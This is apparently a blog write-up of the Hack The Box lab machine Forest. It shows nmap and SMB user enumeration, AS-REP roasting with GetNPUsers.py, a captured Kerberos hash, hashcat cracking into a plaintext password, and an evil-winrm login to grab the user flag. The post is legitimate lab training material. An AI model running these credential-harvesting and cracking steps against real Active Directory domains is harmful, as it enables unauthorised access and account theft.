---
title:  "Hack The Box - Forest"
date:   2020-03-19
categories: [ctf]
tags: [linux, Active Directory, Kali, Pentest, writeups, ctf]
---
My write-up / walktrough for Forrest on Hack The Box.

IP is 10.10.10.161, forest.htb

## Enumeration
`nmap -sV -p 1-10000 -T5 forest.htb`

![nmap](/images/forest/nmap.png)

used `legion`

smbenum gave me 

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

able to ASRepRoast

`sudo python3 /usr/local/bin/GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile user.txt htb.local/
`

```$krb5asrep$23$svc-alfresco@HTB.LOCAL:206e99c105941b80bb9ce49a11f10b0a$33d27576ae3f6c4c01f30b03fe45ae0eb20a12d2768ca6cf0e2d747e38e2406181c5d030bd9b0a9f7eeebef78955939b5b66a799b760723d1a5ed32471bf9234d2b0a2e08f71330cf36b76b2b43a17776df8fea2155674009953f336e852f7b14a6ad5ef11619dcf7761300dd1bc7bda3363f6303448f0759399339ea26ca964f2ace2e3d7959c7ce22bf12b4f756f67b1ba52795cbd97ed3e04dbfb8b8ee37b2f253bc8637dcb2270225eee5e625e8f2e77c085e62bad96bd003b39e961373f61cb8e50411fb2d36a548cd5721eb8f7aa271b62ba32c4fc8fe94b687c9943bf7ce5db4229da
```

![asreproast](/images/forest/asreproast.png)


`GetNPUsers.py` can create a well formated file right away by passing the parameter `-format hashcat -outputfile userhash.txt`

Done so, I could afterwards crack the hash with `hashcat -m18200 --force userhash.txt  /usr/share/wordlists/rockyou.txt` which gives me the credentials `svc-alfresco:s3rvice`

![hashcat](/images/forest/hashcat.png)

this credentials, I could use to establish a connection with winrm (`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
`) and grab the user-flag `e5e4e47ae7022664cda6eb013fb0d9ed`.

![userflag](/images/forest/userflag.png)